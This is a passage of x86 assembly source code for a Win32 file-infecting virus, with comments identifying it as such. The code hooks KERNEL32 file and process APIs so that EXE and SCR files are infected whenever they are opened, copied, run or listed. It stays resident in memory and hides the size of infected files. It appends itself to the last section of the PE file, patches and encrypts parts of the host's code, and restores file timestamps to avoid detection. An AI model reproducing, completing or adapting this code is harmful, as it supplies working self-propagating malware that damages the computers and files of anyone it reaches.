        add     [eax + ecx],esi         ;add delta.. (aack! damned relocationz..)
        mov     [edx + ecx],ebx
        popad
        clc

f_next_reloc:

        loop    fix_relocs              ;get next relocation item
        ret

redo_reloc:

        call    get_relocs
_popad: popad

write_chunk:

        call    [ebp + ddWriteProcessMemory - ebp_num]  ;write chunk of code to the code section
        xchg    ecx,eax
        pop     edx
        cld
        pop     eax
        jecxz   n_host          ;if error, jump and try to stay resident without jumpin back to host
        xor     edx,eax
        lodsw                   ;get pointer to next chunk of code to patch, if any
        jnz     n_host          ;if error, jump and try to stay resident without jumpin back to host
        cwde
        xchg    ecx,eax
        sub     edi,ecx
        jecxz   go_resident     ;no more chunkz, jump and try to stay resident, then jump back to host
        jmp     get_count       ;jump and patch the next chunk
n_host: pop     eax             ;unwind return adress, an error occured, cant jump to host :(

go_resident:

        lea     esi,[ebp + FindData - ebp_num]
        push    MAX_PATH
        push    esi
        push    ecx
        call    [ebp + ddGetModuleFileName - ebp_num]   ;get host filename
        xchg    ecx,eax
        lea     ebx,[ebp + jmp_addr_table - ebp_num]    ;get pointer to start of jump adress table
        jecxz   g_host
        call    Open&MapFile            ;open host filename and memory-map it
g_host: jecxz   jmp_host                ;if error, jump back to host
        push    PAGE_EXECUTE_READWRITE
        push    MEM_COMMIT or MEM_RESERVE or MEM_TOP_DOWN
        push    (virtual_end2 - code_start + 3) and -4
        push    esi     ;NULL           ;let OS choose memory adress
        call    [ebp + ddVirtualAlloc - ebp_num]        ;allocate enough memory for virus code and bufferz
        lea     ecx,[ebp + FunctionNamez2 - ebp_num]    ;get pointer to start of function namez to hook
        mov     edi,non_res - code_start
        xchg    ecx,eax                 ;get size of new allocated block
        lea     esi,[ecx + PathNamez - code_start]
        jecxz   close_jmp_host          ;if error on VirtualAlloc, close file and jump to host
        xchg    edi,ecx                 ;get target adress of new allocated block
        mov     [ebp + pPathNamez - ebp_num],esi        ;initialize pointer to store future pathnamez retrieved by Find(First/Next)File(A/W)
        mov     esi,edi
        xchg    [ebp + pcode_start - ebp_num],esi       ;get source adress of virus code and store new target adress as new source adress
        lea     edx,[edi + ecx + jmp_table_size + 1]
        mov     [ebp + pNewAPIs - ebp_num],edx          ;initialize pointer to store hooked APIs in the new jump table
        cld
        rep     movsb                   ;copy virus code to new allocated block
        mov     [esi],cl                ;force a null to mark the end of function namez to hook
        pop     ecx                     ;get start of memory-maped file
        inc     edi                     ;get pointer to NewAPItable
        push    ecx

hook_api:       ;hook API functionz, retrieve old API adress and build new API entry into jump table..

        pushad
        call    IGetProcAddressIT       ;get RVA pointer of API function inside import table
        test    eax,eax
        jz      next_api_hook           ;if not found, jump and get next API name
        add     eax,[ebp + phost_hdr - ebp_num]         ;convert RVA to real pointer by addin the actual host base adress
        mov     edx,esp
        push    eax
        push    esp
        xchg    esi,eax
        mov     al,0B8h                 ;build "mov eax,?" instruction into jump table
        push    4
        push    edx
        stosb
        call    [ebp + ddGetCurrentProcess - ebp_num]
        push    esi
        push    eax
        cld
        movsd                           ;get and copy old API adress into jump table
        call    [ebp + ddWriteProcessMemory - ebp_num]   ;set our API hook
        cld
        mov     al,0E9h                 ;build "jmp ?" instruction to jump to new API handler
        pop     edx
        pop     ecx
        stosb
        movzx   eax,word ptr [ebx]      ;build relative offset to new API handler
        sub     eax,edi
        add     eax,[ebp + pcode_start - ebp_num]
        stosd
        push    edi

next_api_hook:

        popad
        inc     ebx
        xchg    esi,eax
        @endsz                  ;get pointer to next API name
        inc     ebx
        cmp     [esi],al        ;check end of API namez to hook
        xchg    eax,esi
        jnz     hook_api        ;jump and get next API, if there are more APIz to hook

close_jmp_host:

        call    Close&UnmapFile ;close and unmap host file

jmp_host:

        cld
        pop     eax
        jmp     eax             ;jmp to host.. or try to quit aplication if an error ocurred while patchin the code section

NewGetProcAddr: ;new GetProcAddress API entry point.. hook wanted API functionz from KERNEL32..

        call    APICall@n_2     ;call old GetProcAdress API and retrieve API adress in EAX
        pushad
        mov     ecx,[esp.cPushad.Arg1]  ;get module handle/base adress
        call    get_ebp                 ;get EBP to reference internal variablez correctly
        xchg    ecx,eax
        jecxz   end_getproc             ;get out if retrieved API adress is zero
        sub     eax,[ebp + K32Mod - ebp_num]    ;is it KERNEL32 base adress?
        jnz     end_getproc                     ;no, get out
        lea     edx,[ebp + jmp_addr_table - 2 - ebp_num]        ;yea its KERNEL32, get pointer to start of jump table
        lea     edi,[ebp + FunctionNamez2 - 1 - ebp_num]        ;get pointer to API function namez to hook
        cld

n_gproc_next_str:       ;search specified API function name from the list of posible API namez to hook..

        inc     edx
        scasb                           ;get adress to next API function name
        jnz     $ - 1
        mov     esi,[esp.cPushad.Arg2]  ;get pointer to specified API function name
        inc     edx
        scasb
        jz      end_getproc             ;if end of API namez reached, get out
        dec     edi

n_gproc_next_chr:

        cmpsb                           ;do API namez match?
        jnz     n_gproc_next_str        ;no, get next API name
        dec     edi
        scasb
        jnz     n_gproc_next_chr

n_gproc_apis_match:     ;API namez match, we need to hook the API..

        lea     ebx,[ebp + NewAPItable + nAPIS - 10 - ebp_num]  ;get top of jump table
        mov     edi,[ebp + pNewAPIs - ebp_num]  ;get current pointer to build new API entry
        cmp     ebx,edi                         ;check if jump table is full
        jc      end_getproc                     ;get out if full
        push    edi
        sub     al,-0B8h                ;build "mov eax,?" instruction into jump table
        stosb
        pop     eax
        xchg    eax,[esp.Pushad_eax]    ;retrieve old API adress and swap with the new API adress
        stosd
        mov     al,0E9h                 ;build "jmp ?" instruction to jump to new API handler
        stosb
        movzx   eax,word ptr [edx]      ;build relative offset to new API handler
        sub     eax,edi
        add     eax,[ebp + pcode_start - ebp_num]
        stosd
        mov     [ebp + pNewAPIs - ebp_num],edi  ;update pointer to next API entry in the jump table

end_getproc:

        popad
        ret     (2*Pshd)        ;return to caller

jmp_addr_table: ;adress table.. contains relative offsetz to new API handlerz..

        dw      NewGetProcAddr    - code_start - 4
        dw      NewGetFileAttrA   - code_start - 4
        dw      NewGetFileAttrW   - code_start - 4
        dw      NewMoveFileExA    - code_start - 4
        dw      NewMoveFileExW    - code_start - 4
        dw      New_lopen         - code_start - 4
        dw      NewCopyFileA      - code_start - 4
        dw      NewCopyFileW      - code_start - 4
        dw      NewOpenFile       - code_start - 4
        dw      NewMoveFileA      - code_start - 4
        dw      NewMoveFileW      - code_start - 4
        dw      NewCreateProcessA - code_start - 4
        dw      NewCreateProcessW - code_start - 4
        dw      NewCreateFileA    - code_start - 4
        dw      NewCreateFileW    - code_start - 4
        dw      NewFindCloseX     - code_start - 4
        dw      NewFindFirstFileA - code_start - 4
        dw      NewFindFirstFileW - code_start - 4
        dw      NewFindNextFileA  - code_start - 4
        dw      NewFindNextFileW  - code_start - 4
        dw      NewSetFileAttrA   - code_start - 4
        dw      NewSetFileAttrW   - code_start - 4

jmp_table_size =        $ - jmp_addr_table

NewSetFileAttrW:        ;new API handlerz (unicode version)..
NewCreateFileW:
NewCreateProcessW:
NewMoveFileW:
NewCopyFileW:
NewMoveFileExW:
NewGetFileAttrW:
CommonProcessW:

        test    al,?    ;clear carry (unicode version)
        org     $ - 1

NewSetFileAttrA:        ;new API handlerz (ansi version)..
NewCreateFileA:
NewCreateProcessA:
NewMoveFileA:
NewOpenFile:
NewCopyFileA:
New_lopen:
NewMoveFileExA:
NewGetFileAttrA:
CommonProcessA:

        stc             ;set carry (ansi version)
        pushad
        call    get_ebp2_Uni2Ansi       ;get EBP to reference internal variablez correctly and convert unicode string to ansi (for unicode version APIz)
        jecxz   jmp_old_api
        call    findfirst               ;get atributez, size of file and check if it exists
        jz      jmp_old_api
        dec     eax
        push    eax                     ;save search handle
        @copysz                         ;copy filename to an internal buffer
        call    Process_File2           ;try to infect file..

NCF_close:

        call    [ebp + ddFindClose - ebp_num]   ;close file search

jmp_old_api:

        popad
        jmp     eax                     ;jump to original API adress

NewFindFirstFileW:      ;new findfirst API handler.. infect files, stealth (unicode version)

                test    al,?            ;clear carry (unicode version)
                org     $ - 1

NewFindFirstFileA:      ;new findfirst API handler.. infect files, stealth (ansi version)

                stc                     ;set carry (ansi version)
                call    APICall@n_2     ;call old findfirst API
                pushad
                inc     eax             ;if any error, get out
                jz      go_ret_2Pshd
                dec     eax
                jz      go_ret_2Pshd
                call    get_ebp2_Uni2Ansi       ;get EBP to reference internal variablez correctly and convert unicode string to ansi (for unicode version APIz)
                jecxz   go_ret_2Pshd
                mov     edi,[ebp + pPathNamez - ebp_num]        ;get pointer to new entry in pathnamez table
                lea     ebx,[ebp + PathNamez + nPATHNAMEZ - MAX_PATH - ebp_num] ;get top of pathnamez table
                cmp     edi,ebx
                jnc     go_ret_2Pshd    ;if not enough space to store filename, jump
                mov     ebx,edi
                @copysz                 ;copy filename to pathnamez table
next2_ff:       mov     al,[edi - 1]    ;get end of path..
                add     al,-'\'
                jz      eop_ff
                sub     al,':' - '\'
                jz      eop_ff
                dec     edi
                cmp     ebx,edi
                jc      next2_ff
                xor     al,al
eop_ff:         stosb                   ;force null to split path from filename
                mov     [ebp + pPathNamez - ebp_num],edi        ;update pointer to next entry in pathnamez table
                call    get_handle_ofs_0        ;get new free entry in handlez table
                jc      go_ret_2Pshd
                mov     eax,[esp.Pushad_eax]    ;get handle returned by findfirst
                stosd                           ;store handle into handlez table
                xchg    eax,ebx
                stosd                           ;store pointer to asociated pathname into handlez table as well
                mov     [ebp + pHandlez - ebp_num],edi  ;update pointer to next entry in handlez table
                xchg    esi,eax
                jmp     FindCommon

go_ret_2Pshd:   popad                   ;return to caller
                ret     (2*Pshd)

NewFindNextFileW:       ;new findnext API handler.. infect files, stealth (unicode version)

                test    al,?            ;clear carry (unicode version)
                org     $ - 1

NewFindNextFileA:       ;new findnextt API handler.. infect files, stealth (ansi version)

                stc                     ;set carry (ansi version)
                call    APICall@n_2     ;call old findnext API
                pushad
                call    get_handle_ofs_ebp      ;get correct entry in handlez table acordin to handle
                jc      go_ret_2Pshd
                mov     esi,[edi + 4]   ;get respective pathname

FindCommon:     lea     edi,[ebp + PathName - ebp_num]
                @copysz                 ;copy pathname to respective buffer
                dec     edi
                mov     ebx,[esp.cPushad.Arg2]  ;get WIN32_FIND_DATA parameter
                or      al,[ebp + uni_or_ansi - ebp_num]        ;check if its ansi or unicode
                lea     esi,[ebx.WFD_szFileName]        ;get filename
                jnz     its_ansi_fc
                call    Uni2Ansi        ;its unicode, convert to ansi and atach filename to pathname
its_ansi_fc:    call    Process_File3   ;try to infect file
                call    get_size        ;get file size
                jnz     go_ret_2Pshd
                test    [ebx.WFD_nFileSizeLow.hiw.hib],11111100b  ;filesize > 64MB?
                jnz     go_ret_2Pshd    ;yea, file too large, jump
                div     ecx
                dec     edx
                jns     go_ret_2Pshd    ;if not infected, jump, stealth not necesary
                call    check_PE_file   ;file is infected, do size stealth
                jmp     go_ret_2Pshd

NewFindCloseX:  mov     cl,1
                call    APICall@n       ;call old findclose API
                pushad
                call    get_handle_ofs_ebp      ;get correct entry in handlez table acordin to handle
                jc      go_ret_Pshd
                lea     esi,[edi + 4]
                mov     ecx,[ebp + pHandlez - ebp_num]
                lodsd
                sub     ecx,esi
                pushad
                xchg    esi,eax                                 ;remove pathname entry
                mov     ecx,[ebp + pPathNamez - ebp_num]
                mov     edi,esi
                @endsz
                sub     ecx,esi
                mov     [esp.Pushad_ebx],ecx
                rep     movsb
                mov     [ebp + pPathNamez - ebp_num],edi        ;update pointer to handlez table
                popad
                shr     ecx,3                                   ;remove handle entry
                jz      setH_fc
FixpPathNamez:  movsd
                lodsd
                sub     eax,ebx
                stosd
                loop    FixpPathNamez
setH_fc:        mov     [ebp + pHandlez - ebp_num],edi          ;update pointer to pathnamez table
go_ret_Pshd:    popad
                ret     (Pshd)

Open&MapFile    proc    ;open and map file in read only mode
                        ;  on entry:
                        ;    ESI = pszFileName (pointer to file name)
                        ;  on exit:
                        ;    ECX = 0, if error
                        ;    ECX = base adress of memory-maped file, if ok

                xor     edi,edi

Open&MapFileAdj:        ;open and map file in read/write mode
                        ;  on entry:
                        ;    EDI = file size + work space (in bytes)
                        ;    ESI = pszFileName (pointer to file name)
                        ;  on exit:
                        ;    ECX = 0, if error
                        ;    ECX = base adress of memory-maped file, if ok
                        ;    EDI = old file size

                xor     eax,eax
                push    eax                     ;0
                push    eax                     ;FILE_ATTRIBUTE_NORMAL
                push    OPEN_EXISTING
                push    eax                     ;NULL
                mov     al,1
                push    eax                     ;FILE_SHARE_READ
                ror     eax,1                   ;GENERIC_READ
                mov     ecx,edi
                jecxz   $ + 4
                rcr     eax,1                   ;GENERIC_READ + GENERIC_WRITE
                push    eax
                push    esi                     ;pszFileName
                call    [ebp + ddCreateFileA - ebp_num]         ;open file
                cdq
                xor     esi,esi
                inc     eax
                jz      end_Open&MapFile        ;if error, jump
                dec     eax
                push    eax                     ;push first handle

                push    edx                     ;NULL
                push    edi                     ;file size + buffer size
                push    edx                     ;0
                mov     dl,PAGE_READONLY
                mov     ecx,edi
                jecxz   $ + 4
                shl     dl,1                    ;PAGE_READWRITE
                push    edx
                push    esi                     ;NULL
                push    eax                     ;handle
                call    [ebp + ddCreateFileMappingA - ebp_num]  ;create file mapping
                cdq
                xchg    ecx,eax
                jecxz   end_Open&MapFile2       ;if error, close handle and jump
                push    ecx                     ;push second handle

                push    edi                     ;file size + buffer size
                push    edx                     ;0
                push    edx                     ;0
                mov     dl,FILE_MAP_READ
                test    edi,edi
                .if     !zero?
                shr     dl,1                            ;FILE_MAP_WRITE
                mov     edi,[ebx.WFD_nFileSizeLow]
                .endif
                push    edx
                push    ecx                     ;handle
                call    [ebp + ddMapViewOfFile - ebp_num]       ;map view of file
                xchg    ecx,eax
                jecxz   end_Open&MapFile3
                push    ecx                     ;push base adress of memory-maped file

                jmp     [esp.(3*Pshd).RetAddr]  ;jump to return adress leavin parameterz in the stack

Open&MapFile    endp

Close&UnmapFile proc    ;close and unmap file previosly opened in read only mode

                xor     edi,edi

Close&UnmapFileAdj:     ;close and unmap file previosly opened in read/write mode

                pop     [esp.(4*Pshd).RetAddr - Pshd]
                call    [ebp + ddUnmapViewOfFile - ebp_num]     ;unmap view of file

end_Open&MapFile3:

                call    [ebp + ddCloseHandle - ebp_num] ;close handle
                mov     ecx,edi
                jecxz   end_Open&MapFile2       ;if read-only mode, jump
                pop     eax
                push    eax
                push    eax
                xor     esi,esi
                push    esi
                push    esi
                push    edi
                push    eax
                xchg    edi,eax
                call    [ebp + ddSetFilePointer - ebp_num]      ;move file pointer to the real end of file
                call    [ebp + ddSetEndOfFile - ebp_num]        ;truncate file at real end of file
                lea     eax,[ebx.WFD_ftLastWriteTime]
                push    eax
                push    esi
                push    esi
                push    edi
                call    [ebp + ddSetFileTime - ebp_num] ;restore original date/time stamp field

end_Open&MapFile2:

                call    [ebp + ddCloseHandle - ebp_num] ;close handle

end_Open&MapFile:

                xor     ecx,ecx
                ret

Close&UnmapFile endp

get_ebp2_Uni2Ansi:      ;this function sets EBP register to reference internal
                        ;  variablez correctly and also converts unicode
                        ;  strings to ansi (for unicode version APIz only).
                        ;this function is only useful at the resident stage.
                        ;on entry:
                        ;  TOS+28h (Pshd.cPushad.Arg1): pointer to specified file name
                        ;on exit:
                        ;  ECX = 0, if error

        mov     esi,[esp.(Pshd).cPushad.Arg1]   ;get source pointer to specified file name
        call    get_ebp2                        ;get actual EBP
        lea     edi,[ebp + PathName - ebp_num]  ;get target pointer to internal buffer
        jc      ansiok

Uni2Ansi:       ;this function converts an ansi string to a unicode string
                ;on entry:
                ;  ESI = pointer to specified file name
                ;on exit:
                ;  ECX = 0, if error

        xor     eax,eax
        push    eax                                     ;NULL
        push    eax                                     ;NULL
        push    MAX_PATH
        push    edi                                     ;target pointer
        push    -1
        push    esi                                     ;source pointer
        push    eax
        push    eax                                     ;CP_ACP
        call    [ebp + ddWideCharToMultiByte - ebp_num]
        mov     esi,edi
ansiok: xchg   ecx,eax
        cld
        ret

Rva2Raw proc    ;this function converts RVA valuez to RAW pointerz inside PE
                ;  filez. This function is specialy useful for memory-maped
                ;  filez.
                ;given a RVA value, this function returns the start adress
                ;  and size of the section containin it, plus its relative
                ;  delta value inside the section.
                ;on entry:
                ;  EAX = RVA value
                ;  EBP = start of memory-maped file (MZ header)
                ;  ESI = start of PE header + 3Ch
                ;on exit:
                ;  EBP = RAW size of section
                ;  EBX = RAW start of section
                ;  ECX = 0, if not found
                ;        start of respective section header (+ section header
                ;        size), if found
                ;  EDX = RVA start of section
                ;  ESI = relative delta of RVA value inside section.

        movzx   ecx,word ptr [esi.NT_FileHeader         \ ;get number of sectionz
                                 .FH_NumberOfSections   \
                                 -MZ_lfanew]
        jecxz   end_Rva2Raw
        movzx   ebx,word ptr [esi.NT_FileHeader         \ ;get first section header
                          .FH_SizeOfOptionalHeader      \
                          -MZ_lfanew]
        lea     ebx,[esi.NT_OptionalHeader + ebx - MZ_lfanew]
        x =     IMAGE_SIZEOF_SECTION_HEADER

match_virtual:  ;scan each PE section header and determine if specified RVA
                ;value points inside

        mov     esi,eax
        mov     edx,[ebx.SH_VirtualAddress]
        sub     esi,edx
        sub     ebx,-x
        cmp     esi,[ebx.SH_VirtualSize - x]    ;is RVA value pointin inside current section?
        jb      section_found                   ;yea we found the section, jump
        loop    match_virtual                   ;nope, get next section

end_Rva2Raw:

        ret

Rva2Raw endp

get_handle_ofs_ebp:     ;this function sets EBP register to reference internal
                        ;  variablez correctly and also given a handle, it gets
                        ;  a pointer to an entry in the handlez table.
                        ;this function is only useful at the resident stage.
                        ;on entry:
                        ;  TOS+28h (Pshd.cPushad.Arg1): specified handle
                        ;on exit:
                        ;  EDI = pointer to entry in handlez table
                        ;  Carry clear, if ok
                        ;  Carry set, if error

                xchg    ecx,eax
                jecxz   end_gho_stc
                call    get_ebp2
                mov     ecx,[esp.(Pshd).cPushad.Arg1]   ;get handle
                jecxz   end_gho_stc
                xchg    eax,ecx
                cmp     ax,?
                org     $ - 2

get_handle_ofs_0:   ;gets a pointer to an empty entry in the handlez table
                    ;this function is only useful at the resident stage.
                    ;on exit:
                    ;  EDI = pointer to entry in handlez table
                    ;  Carry clear, if ok
                    ;  Carry set, if error

                sub   eax,eax

get_handle_ofs: ;given a handle, this function gets a pointer
                ;  to an entry in the handlez table.
                ;this function is only useful at the resident stage.
                ;on entry:
                ;  EAX = specified handle
                ;on exit:
                ;  EDI = pointer to entry in handlez table
                ;  Carry clear, if ok
                ;  Carry set, if error

                lea     edi,[ebp + Handlez - 8 - ebp_num]
                lea     edx,[edi + nHANDLEZ]
      next_gho: scasd                           ;add edi,8
                scasd                           ;
                cmp     edx,edi         ;top of handlez table reached?
                jc      end_gho         ;yea, handle not found, jump
                cmp     eax,[edi]       ;do handlez match?
                jnz     next_gho        ;no, check next handle, jump
                test    al,?            ;yea, handle found, clear carry
                org     $ - 1
   end_gho_stc: stc                     ;set carry
       end_gho: ret

section_found:

        x =     IMAGE_SIZEOF_SECTION_HEADER
        xchg    ebp,ebx
        add     ebx,[ebp.SH_PointerToRawData - x]       ;get RAW start of section
        xchg    ecx,ebp
        mov     ebp,[ecx.SH_SizeOfRawData - x]          ;get RAW size of section
        cld
        ret

get_relocs:     ;this comon funtion is called from both instalation and
                ;  infection stage.
                ;it simply locates each relocation block in the .reloc section
                ;  and calls a function to (a) nulify those dangerous reloca-
                ;  tionz in a block (infection stage) or (b) to fix the code
                ;  pointed to by such marked relocationz (instalation stage).
                ;on entry:
                ;  EDI = RVA start pointer to chunk of code
                ;  TOS+04h (Arg1): fix_relocs label function adress (instalation stage)
                ;                    or
                ;                  nul_relocs label function adress (infection stage)
                ;  TOS+00h (return adress)

        add     esi,ebx         ;get start of relocation section in aplication context
        add     edx,edi         ;get end adress of chunk code
        lea     ebp,[ecx+esi]   ;get end of relocation section in aplication context

process_reloc_blocks:

        lodsd
        xchg    ebx,eax                 ;get start RVA for this block of relocationz
        lea     ecx,[ebx + 4096]        ;get end RVA where relocationz can point in a block
        lodsd                           ;get size of reloc block
        x =     IMAGE_SIZEOF_BASE_RELOCATION
        add     eax,-x
        cmp     edi,ecx          ;RVA pointer inside relocation block? (check low boundary)
        lea     ecx,[eax + esi]  ;get next block adress
        push    ecx
        jnc     next_reloc_block
        shr     eax,1
        cmp     ebx,edx          ;RVA pointer inside relocation block? (check high boundary)
        jnc     next_reloc_block
        xchg    ecx,eax          ;get number of relocationz for this block
        jecxz   next_reloc_block

        call    [esp.(Pshd).Arg1]       ;call fix_relocs function or nul_relocs function

next_reloc_block:

        pop     esi                     ;get next block adress
        lea     eax,[esi + x]
        cmp     eax,ebp                 ;end of relocation blockz?
        jc      process_reloc_blocks    ;no, process the block, jump
        ret     (Pshd)                  ;yea, no more relocation blockz, return

Process_File3:  ;this function copies a filename to an internal buffer
                ;  and checks the extension thru a list of infectable
                ;  extensions (EXE and SCR filez for the moment). If
                ;  the extension matches, the file will be infected.
        @copysz
        mov     edx,not 0FF202020h              ;upercase mask
        mov     ecx,[edi-4]                     ;get filename extension
        lea     esi,[ebp + Exts - ebp_num]      ;get pointer to list of extensionz
        and     ecx,edx                         ;convert file extension to upercase

next_ext:

        lodsd                           ;get extension from list
        dec     al                      ;no more extensionz?
        js      end_PF3
        and     eax,edx                 ;convert extension to upercase
        dec     esi
        xor     eax,ecx                 ;do extensionz match?
        jnz     next_ext
        cmp     byte ptr [edi-5],'.'
        jnz     end_PF3                 ;no, get next extension
        call    Process_File2           ;yes, extensionz match, infect file

end_PF3: ret

err_Rva2Raw:

        popad   ;needed to unwind the stack from some function

err_Rva2Raw2:

        popad   ;needed to unwind the stack from some function
        ret

Attach  proc    ;attach virus code to last section in the PE file and
                ;  change section characteristicz to reflect infection.
                ;on entry:
                ;  ECX = base of memory-maped file
                ;  EDI = original file size
                ;on exit:
                ;  EDI = new file size

        lea     esi,[ecx.MZ_lfanew]                     ;get base of PE header + 3Ch
        mov     eax,[ebp + pcode_start - ebp_num]       ;get start adress of virus code
        add     esi,[esi]
        mov     edx,[esi.NT_OptionalHeader      \       ;get built-in image base
                        .OH_ImageBase           \
                        -MZ_lfanew]
        pushad                                          ;save valuez to stack
        xor     eax,eax
        x =     IMAGE_SIZEOF_SECTION_HEADER
        sub     al,-x
        mul     byte ptr [esi.NT_FileHeader     \       ;get number of sectionz
                      .FH_NumberOfSections      \
                      -MZ_lfanew]
        add     ax,word ptr [esi.NT_FileHeader  \       ;get first section header
                       .FH_SizeOfOptionalHeader \
                       -MZ_lfanew]
        jc      err_Rva2Raw2
        lea     ebx,[esi.NT_OptionalHeader - MZ_lfanew + eax]
        mov     eax,[esi.NT_OptionalHeader.OH_SectionAlignment - MZ_lfanew]
        mov     edx,[esi.NT_OptionalHeader.OH_FileAlignment - MZ_lfanew]
        dec     eax
        dec     edx
        or      eax,edx                 ;check SectionAlignment and FileAlignment fieldz
        cmp     eax,10000h
        jnc     err_Rva2Raw2            ;too large?
        add     edi,ecx                 ;get end of file in MM-file
        inc     al
        jnz     err_Rva2Raw2
        mov     eax,[ebx.SH_VirtualAddress - x]
        mov     ebp,ecx                 ;get MM-file base address
        add     eax,edi
        add     ecx,[ebx.SH_PointerToRawData - x]
        sub     eax,ecx                 ;get new RVA entry point

;at this point:
;
; cPushad.EAX = source adress of code to copy (start at encrypted stringz)
; cPushad.EBX = embedded (in PE header) host base address
;         EBP = start of MM-file. Base address of MM-file
;         EAX = new RVA entry point (start of virus code RVA)
;         EDX = file alignment - 1
;         EDI = target adress where code will be copied to in the MM-File
;         ECX = start adress of last section in the MM-file
;         EBX = start adress of last section header (plus section header size)
;                 in the MM-file
;         ESI = start of PE header (+ 3Ch) in the MM-file

        pushad
        mov     eax,[esi.NT_OptionalHeader      \       ;get current entry point
                        .OH_AddressOfEntryPoint \
                        -MZ_lfanew]

;on entry:
;
;  EAX = Host EntryPoint RVA
;  EBP = start of MZ header (start of MM-file)
;  ESI = start of PE header + 3Ch (in MM-file)

        call    Rva2Raw         ;find true code section (clue: EntryPoint RVA points inside)

;on exit:
;
;  EBP = raw size of CODE section
;  EBX = raw start of CODE section
;  ECX = 0, if not found
;        start of CODE section header (+ section header size), if found
;  EDX = start of CODE section RVA
;  ESI = relative delta of RVA inside CODE section.

        jecxz   err_Rva2Raw     ;code section not found, invalid EntryPoint
        pushad
        mov     ebp,esp
        mov     edx,[ebp.(2*cPushad).Pushad_ebp]        ;get original ebp
        x =     IMAGE_SIZEOF_SECTION_HEADER
        or      byte ptr [ecx.SH_Characteristics.hiw.hib - x],20h  ;set exec bit to section

exec_set:

        mov     esi,[edx + ImportHdr - ebp_num] ;get import section header
        xor     ecx,esi                         ;is import table inside code section?
        jz      IT_in_Code                      ;yea, jump

        ;import table NOT inside code section (i.e. probably exists an .idata section)

        or      byte ptr [esi.SH_Characteristics.hiw.hib - x],80h       ;set writable bit

IT_in_Code:     ;import table is inside code section (stupid microsoft)
                ;no need to set the writable bit (the exec bit does the job)

        sub     ecx,ecx
        push    edi                     ;need this value l8r, push it
        mov     cl,5
        sub     eax,0B2FD26A3h
sub_1st_val =   dword ptr $ - 4
        add     edi,ecx                 ;add edi,5
        stosd
        push    edi
        mov     eax,ecx                 ;ax = 5
        stosw
        sub     al,- 0e9h + 5           ;al = E9h
        stosb
        mov     eax,[ebp.cPushad.Pushad_eax]    ;get RVA start of virus code
        sub     eax,[ebp.Pushad_eax]
        sub     eax,ecx                 ;sub eax,5
        stosd
        xor     eax,eax
        pop     esi
        stosw                           ;0
        mov     edi,[ebp.Pushad_eax]

nulify_relocs:  ;nulify relocs that could overwrite our inserted chunks of code..

        push    edi
        lodsw
        cwde
        pushad
        mov     esi,[ebp.cPushad.Pushad_esi]      ;get PE header (+ 3Ch)
        mov     ecx,[esi.NT_OptionalHeader      \ ;get size of relocation blockz
                        .OH_DirectoryEntries    \
                        .DE_BaseReloc           \
                        .DD_Size                \
                        -MZ_lfanew]
        jecxz   go_popad                ;no relocationz, jump
        push    eax                     ;save size of this chunk of code temporarily
        push    ecx
        mov     ebp,[ebp.cPushad.Pushad_ebp]      ;get base of MM-file (MZ header)
        mov     eax,[esi.NT_OptionalHeader      \ ;get RVA start of relocation blockz
                        .OH_DirectoryEntries    \
                        .DE_BaseReloc           \
                        .DD_VirtualAddress      \
                        -MZ_lfanew]
        call    Rva2Raw                 ;convert RVA to a raw offset inside the section
        pop     eax
        pop     edx                     ;retrieve size of this chunk of code temporarily
        jecxz   go_popad
        xchg    ecx,eax
        call    mark_reloc      ;pass nul_relocs as a parameter to get_relocs function

nul_relocs:

        lodsw                   ;get relocation item
        cwde
        ror     eax,3*4
        add     al,- IMAGE_REL_BASED_HIGHLOW    ;check relocation type
        jnz     n_next_reloc                    ;not valid, get next relocation item
        shr     eax,5*4                         ;strip or blank relocation type field from relocation item
        lea     eax,[eax + ebx + 4]             ;convert relocation pointer to RVA
        cmp     edi,eax                         ;check if relocation points to our chunk of code..
        jnc     n_next_reloc                    ;check low boundary
        add     eax,-4
        cmp     eax,edx                         ;check high boundary
        jnc     n_next_reloc                    ;it doesnt point to our chunk of code, get next relocation item

        ;this relocation item is pointing inside our chunk of code..
        ;nulify and mark it!

        and     byte ptr [esi.hib - 2],not (mask RD_RelocType shr 8)    ;nulify relocation!

n_next_reloc:

        loop    nul_relocs                      ;get next relocation item
        ret

mark_reloc:

        call    get_relocs

go_popad:

        popad
        xchg    ecx,eax                 ;size of this chunk of code
        add     edi,[ebp.Pushad_ebx]    ;convert RVA start of chunk of code to a raw value
        sub     edi,[ebp.Pushad_edx]

pre_crypt:

        lodsb                           ;encrypt chunk of code..
        xchg    [edi],al
        ror     al,cl
        inc     edi
        xor     al,06Ah
_xor_2nd_val =  byte ptr $ - 1
        mov     [esi-1],al
        loop    pre_crypt
        lodsw                           ;get next chunk of code
        cwde
        pop     edi
        xchg    ecx,eax                 ;no more chunkz?
        jecxz   pre_crypt_done
        sub     edi,ecx                 ;point EDI to next chunk
        jmp     nulify_relocs           ;check relocationz, jump

pre_crypt_done:

        sub     al,-0e8h                ;build 'call' instruction
        pop     edi
        stosb
        lea     eax,[eax + get_base - code_start - 4 - 0e8h + esi] ;
        sub     eax,edi
        stosd
        mov     cx,(v_end - code_start + 3)/4
        add     eax,edi
        mov     edi,[ebp.cPushad.cPushad.Pushad_eax]    ;get start of virus code
        mov     edx,[ebp.cPushad.cPushad.Pushad_edx]    ;get embedded base
        xchg    esi,edi
        rep     movsd                                   ;copy virus code
        sub     ecx,[ebp.cPushad.Pushad_eax]
        mov     [ebp.cPushad.Pushad_edi],edi
        add     ecx,-5
        mov     [eax + old_base - get_base],edx         ;hardcode some valuez..
        mov     [eax + delta_host - get_base],ecx
        popad
        popad

        x =     IMAGE_SIZEOF_SECTION_HEADER

        sub     edi,ecx         ;change characteristicz of last section in the PE header..
        lea     ecx,[edx + edi]
        xchg    edx,eax
        inc     eax
        cdq     ;edx=0
        xchg    ecx,eax
        div     ecx             ;calculate new size of last section
        mul     ecx
        xchg    eax,edi
        mov     ecx,[esi.NT_OptionalHeader.OH_SectionAlignment - MZ_lfanew]
        sub     eax,v_end - virtual_end
        cmp     [ebx.SH_VirtualSize - x],eax    ;calculate new virtual size of last section
        jnc     n_vir
        mov     [ebx.SH_VirtualSize - x],eax
 n_vir: dec     eax
        mov     [ebx.SH_SizeOfRawData - x],edi  ;update size of last section
        add     eax,ecx
        div     ecx
        mul     ecx
        pop     ebp                             ;get original file size
        add     eax,[ebx.SH_VirtualAddress - x]
        cmp     [esi.NT_OptionalHeader.OH_SizeOfImage - MZ_lfanew],eax  ;update size of image field in the PE header
        jnc     n_img
        mov     [esi.NT_OptionalHeader.OH_SizeOfImage - MZ_lfanew],eax
 n_img: add     edi,[ebx.SH_PointerToRawData - x]
        sub     ecx,ecx
